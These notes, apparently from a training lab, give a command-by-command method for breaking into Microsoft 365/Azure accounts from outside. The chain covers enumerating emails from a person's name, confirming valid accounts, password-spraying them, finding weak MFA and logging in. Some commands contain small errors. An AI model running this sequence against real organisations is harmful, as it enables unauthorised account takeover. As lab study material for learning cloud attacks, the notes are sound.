## Method Overview
uwg → o3365enum → oh365userfinder | o365spray → MFASweep → Pwned!
uwg.py
Atacking Azure Accounts From External
Identify user to attack “ie : John Doe”
Generate random name to test email using github repo ---> [GitHub - hac01/uwg:](https://github.com/hac01/uwg/) This tool can help you generate email or user wordlist from a single argument or a file containing multiple names

# Step 1
Use the uwg to generate a wordlist for a single name and save it to a file
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 python3 main.py -n "Ingrid Johansen" -d megabigtech.com
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Step 2
## o365enum.py
Verify email exist by confirming result of header usiong 0365enum

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python3 o365enum.py -u wordlist.txt -n 1 -m office.com
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Step 3
## oh365userfinder.py
Use the word list generated to spray attack the account

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 python3 oh365userfinder.py -p 'Velkommen1' --pwspray -- elist email.txt 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

## PasswordSpray365.py

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo python3 o365spray.py --spray -U ~/lab/userlist -P ~/lab/pass --lockout 10 --domain 'megabigtech.com'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

## MFA Sweep.ps1
From Kali switch to powershell using 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
pwsh
import-module ./MFASweep.ps1
invoke-mfasweep
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If account was detected with weak authentication, login with 
```
az loging
connect az-accounts
connect-mggraph
```

## Profit